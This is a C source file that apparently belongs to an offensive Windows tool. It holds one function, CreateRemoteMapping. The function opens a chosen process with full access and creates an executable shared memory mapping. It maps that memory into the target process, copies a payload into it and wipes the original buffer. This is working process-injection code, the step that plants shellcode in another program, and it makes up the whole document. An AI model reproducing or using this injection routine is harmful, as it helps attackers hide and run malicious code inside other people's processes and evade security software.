#include "../include/mapping.h"

BOOL CreateRemoteMapping(IN DWORD ProcId, IN PBYTE pPayload, IN SIZE_T payloadSize, OUT PVOID* remoteMapPTR) {
    printf("[*] Creating File Mapping handle...\n");
    HANDLE hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, (DWORD)payloadSize, NULL);
    if (hFile == NULL) {
        printf("[!] CreateFileMappingW Failed With Error: %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] File Mapping handle created: 0x%p\n", hFile);

    printf("[*] Opening target process PID: %d...\n", ProcId);
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcId);
    if (hProc == NULL) {
        printf("[!] OpenProcess Failed With Error: %d\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }
    printf("[+] Target process opened successfully: 0x%p\n", hProc);

    printf("[*] Mapping local view of file...\n");
    PVOID LocalPtr = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, payloadSize);
    if (LocalPtr == NULL) {
        printf("[!] MapViewOfFile Failed With Error: %d\n", GetLastError());
        CloseHandle(hProc);
        CloseHandle(hFile);
        return FALSE;
    }
    printf("[+] Local view mapped at: 0x%p\n", LocalPtr);

    printf("[*] Mapping remote view of file to PID: %d...\n", ProcId);
    PVOID MapPtr = MapViewOfFile2(hFile, hProc, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
    if (MapPtr == NULL) {
        printf("[!] MapViewOfFile2 Failed With Error: %d\n", GetLastError());
        UnmapViewOfFile(LocalPtr);
        CloseHandle(hProc);
        CloseHandle(hFile);
        return FALSE;
    }
    printf("[+] Remote view mapped at: 0x%p\n", MapPtr);

    printf("[*] Copying payload to local view...\n");
    RtlCopyMemory(LocalPtr, pPayload, payloadSize);
    printf("[+] Memory copied successfully.\n");

    printf("[*] Zeroing out source payload buffer...\n");
    RtlZeroMemory(pPayload, payloadSize);
    printf("[+] Source payload buffer zeroed.\n");

    *remoteMapPTR = MapPtr;
    return TRUE;
}
